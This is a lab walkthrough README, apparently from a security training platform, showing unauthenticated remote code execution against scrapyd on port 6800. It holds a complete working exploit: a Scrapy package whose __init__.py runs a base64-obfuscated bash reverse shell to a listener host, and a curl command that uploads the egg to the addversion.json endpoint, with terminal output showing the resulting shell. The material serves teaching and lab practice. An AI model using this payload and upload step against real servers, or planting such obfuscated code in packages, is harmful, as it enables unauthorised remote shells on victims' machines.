# scrapyd Unauthenticated RCE Vulnerability

> [中文文档](README.md)

| Attribute | Details |
|-----------|---------|
| **Vulnerability Name** | scrapyd Unauthenticated RCE |
| **Affected Component** | scrapyd |
| **Vulnerability Type** | Unauthenticated Remote Code Execution |
| **Severity** | 🔴 High |
| **Default Port** | 6800 |

---

## Overview

`scrapyd` is a cloud service provided by the `scrapy` web scraping framework. Users can deploy their `scrapy` packages to this cloud service, which listens on port `6800` by default. If an attacker can access this port, they can deploy malicious code to the server and gain server access.

---

## Vulnerability Reproduction

After the target machine starts, access `http://your-ip:6800` to view the `scrapyd` service `Web` interface:

![scrapyd Web Interface](https://static.nextcyber.cn/attachments/images/course/task/8add67b11ada4c489424b3e603884722.png)

---

## Exploitation

First, we construct a malicious `scrapy` package:

```bash
pip install scrapy scrapyd-client
scrapy startproject evil
cd evil
```

```bash
┌──(root㉿nextcyber)-[~]
└─# scrapy startproject evil
New Scrapy project 'evil', using template directory '/usr/local/lib/python3.11/dist-packages/scrapy/templates/project', created in:
    /root/evil

You can start your first spider with:
    cd evil
    scrapy genspider example example.com                                                                                                                          
┌──(root㉿nextcyber)-[~]
└─# ls
evil
                   
┌──(root㉿nextcyber)-[~]
└─# cd evil           
                 
┌──(root㉿nextcyber)-[~/evil]
└─# cd evil 
                                                                                                 
┌──(root㉿nextcyber)-[~/evil/evil]
└─# ls
__init__.py  __pycache__  items.py  middlewares.py  pipelines.py  settings.py  spiders
```

Edit `__init__.py` and add malicious code:

```bash
bash -i >& /dev/tcp/192.168.2.6/1234 0>&1

# base64 encoded

YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE=
```

```python
import os

os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE= | base64 -d | bash')
```

Deploy the project, package the `Scrapy` project into an `Egg` file (`.egg` file) and name it `evil.egg`:

```bash
┌──(root㉿nextcyber)-[~/evil/evil]
└─# vim __init__.py 
                                                                                                  
┌──(root㉿nextcyber)-[~/evil/evil]
└─# cat __init__.py 
import os

os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi8xMjM0IDA+JjE= | base64 -d | bash')

┌──(root㉿nextcyber)-[~/evil/evil]
└─# cd ..                                                                                        
                                                                  
┌──(root㉿nextcyber)-[~/evil]
└─# ls
evil  scrapy.cfg

┌──(root㉿nextcyber)-[~/evil]
└─# scrapyd-deploy --build-egg=evil.egg
Writing egg to evil.egg

┌──(root㉿nextcyber)-[~/evil]
└─# ls
build  evil  evil.egg  project.egg-info  scrapy.cfg  setup.py
```

Start a local listener on port `1234`, then send the malicious package to the `API` endpoint:

```bash
curl http://192.168.2.73:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

![Exploitation](https://static.nextcyber.cn/attachments/images/course/task/b12650f76ffb446d80fcff49bb4317fb.png)

The exploitation is successful, gaining a `shell` as the `nobody` user.

---

## Lab Practice

Practice this vulnerability online at [NextCyber Lab](https://app.nextcyber.cn/courses/146).

---

> ⚠️ **Disclaimer**: All content in this directory is for learning and research purposes only. Please do not use it for any illegal activities.